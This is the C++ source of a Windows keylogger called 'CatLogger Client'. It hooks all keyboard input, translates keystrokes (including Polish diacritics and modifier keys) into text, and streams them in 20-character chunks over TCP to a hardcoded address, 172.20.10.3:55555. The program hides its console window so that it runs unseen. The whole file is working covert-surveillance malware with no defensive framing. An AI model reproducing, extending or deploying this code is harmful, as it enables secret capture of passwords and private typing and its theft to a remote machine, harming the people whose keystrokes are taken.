// CatLogger Client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <tchar.h>
#include <Windows.h>
//#include <stdio.h>
#include <queue>
#include <string>
#include <fstream>
#include "KeyConstants.h"
#include <ctime>


using namespace std;

#pragma ignore_warnings;

SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
int port = 55555;
WSADATA wsaData;
int wsaerr;
queue<string> keyEvents;

string buffer;




LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam)
{

	if (nCode < 0)
		CallNextHookEx(NULL, nCode, wParam, lParam);

	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
	bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
	bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
	bool altPressed = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
	

	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) // check when key is pressed down or hold
	{
		
		if (kbs->vkCode >= 'A' && kbs->vkCode <= 'Z')
		{
			if (shiftPressed || capsLockOn)
			{
				// Wielka litera
				
				if (altPressed)
				{
					switch (kbs->vkCode)
					{
						case 'A':
							buffer += "[A-PL]";
							break;
						case 'C':
							buffer += "[C-PL]";
							break;
						case 'E':
							buffer += "[E-PL]";
							break;
						case 'L':
							buffer += "[L-PL]";
							break;
						case 'N':
							buffer += "[N-PL]";
							break;
						case 'O':
							buffer += "[O-PL]";
							break;
						case 'S':
							buffer += "[S-PL]";
							break;
						case 'X':
							buffer += "[X-PL]";
							break;
						case 'Z':
							buffer += "[Z-PL]";
							break;
					}
				}
				else
				{
					buffer += Keys::KEYS[kbs->vkCode].Name;
				}
			}

			else
			{
				if (altPressed)
				{
					switch (kbs->vkCode)
					{
					case 'A':
						buffer += "[a-PL]";
						break;
					case 'C':
						buffer += "[c-PL]";
						break;
					case 'E':
						buffer += "[e-PL]";
						break;
					case 'L':
						buffer += "[l-PL]";
						break;
					case 'N':
						buffer += "[n-PL]";
						break;
					case 'O':
						buffer += "[o-PL]";
						break;
					case 'S':
						buffer += "[s-PL]";
						break;
					case 'X':
						buffer += "[x-PL]";
						break;
					case 'Z':
						buffer += "[z-PL]";
						break;

					}
				}
				else
				{
					buffer += char(kbs->vkCode + 32);
				}


			}
		}
		else
		{
			if (shiftPressed)
			{
				switch (kbs->vkCode)
				{
				case '1':
					buffer += char(33);
					break;
				case '2':
					buffer += char(64);
					break;
				case '3':
					buffer += char(35);
					break;
				case '4':
					buffer += char(36);
					break;
				case '5':
					buffer += char(37);
					break;
				case '6':
					buffer += char(94);
					break;
				case '7':
					buffer += char(38);
					break;
				case '8':
					buffer += char(42);
					break;
				case '9':
					buffer += char(40);
					break;
				case '0':
					buffer += char(41);
					break;
				case VK_OEM_MINUS:
					buffer += '_';
					break;
				case VK_OEM_1:
					buffer += ':';
					break;
				case VK_OEM_7:
					buffer += '"';
					break;
				case VK_OEM_102:
					buffer += '|';
				case VK_OEM_COMMA:
					buffer += '<';
					break;
				case VK_OEM_PERIOD:
					buffer += '>';
					break;
				case VK_OEM_2:
					buffer += '?';
					break;
				case VK_OEM_3:
					buffer += '~';
					break;
				case VK_OEM_4:
					buffer += '{';
					break;
				case VK_OEM_5:
					buffer += '|';
					break;
				case VK_OEM_6:
					buffer += '}';
					break;
				case VK_OEM_PLUS:
					buffer += '+';
					break;

				}
				
			}
			else { buffer += Keys::KEYS[kbs->vkCode].Name; } // use the system name from keyboard and use our map to convert it to a human friendly name
		}
		
		if (kbs->vkCode == VK_RETURN) // new line if enter was pressed
			buffer += '\n';
	}
	else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL ||
			key == VK_RCONTROL || key == VK_SHIFT ||
			key == VK_RSHIFT || key == VK_LSHIFT ||
			key == VK_MENU || key == VK_LMENU ||
			key == VK_RMENU || key == VK_CAPITAL ||
			key == VK_NUMLOCK || key == VK_LWIN ||
			key == VK_RWIN)
		{
			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			buffer += KeyName;
		}
	}

	if (buffer.size() >= 20)
	{
		send(clientSocket, buffer.c_str(), buffer.size(), 0);
		buffer.clear();
	}


	return CallNextHookEx(NULL, nCode, wParam, lParam);
}



int WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	//saveScreenshot("screenshot.bmp", 0, 0, 1920, 1080);
    // Get the console window handle
    HWND hWnd = GetConsoleWindow();

    // Hide the console window from the task bar
    ShowWindow(hWnd, SW_HIDE);

    // Prevent the console window from being brought to the front
    SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
    
    WORD wVersionRequested = MAKEWORD(2, 2);

	WSADATA wsaData;
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    if (wsaerr != 0)
    {
        //cout << "The Winsock dll not found!" << endl;
        return 0;
    }
    else
    {
        //cout << "The Winsock dll found" << endl;
        //cout << "The status: " << wsaData.szSystemStatus << endl;
    }

    clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    if (clientSocket == INVALID_SOCKET)
    {
        cout << "Error at socket(): " << WSAGetLastError() << endl;
        WSACleanup();
        return 0;
    }
    else
    {
        cout << "socket() is ok!" << endl;
    }

    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    InetPton(AF_INET, _T("172.20.10.3"), &clientService.sin_addr.s_addr);
    clientService.sin_port = htons(port);
    if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR)
    {
        cout << "Client: connect() - Failed to connect." << endl;
        WSACleanup();
        return 0;
    }
    else
    {
        cout << "Client: connect() is OK." << endl;
        cout << "Client: Can start sending and receiving data..." << endl;
		// Get the current time
		string systemBuffer;
		time_t currentTime = time(nullptr);
		char timeBuffer[26];
		ctime_s(timeBuffer, sizeof(timeBuffer), &currentTime);

		string message =
			"\n=============== \n" + std::string(timeBuffer);
		
		send(clientSocket, message.c_str(), sizeof(message), 0);
    }
	
	//WSACleanup();	

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KBDHook, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to set hook.\n");
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // Check if there are keyboard events to send
        while (!keyEvents.empty()) {
            std::string keyEvent = keyEvents.front();
            keyEvents.pop();

            // Send the key event over the network
            if (send(clientSocket, keyEvent.c_str(), keyEvent.size() + 1, 0) == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(clientSocket);
                WSACleanup();
                return 1;
            }
        }
    }
    system("pause");
    WSACleanup();
    return 0;
}

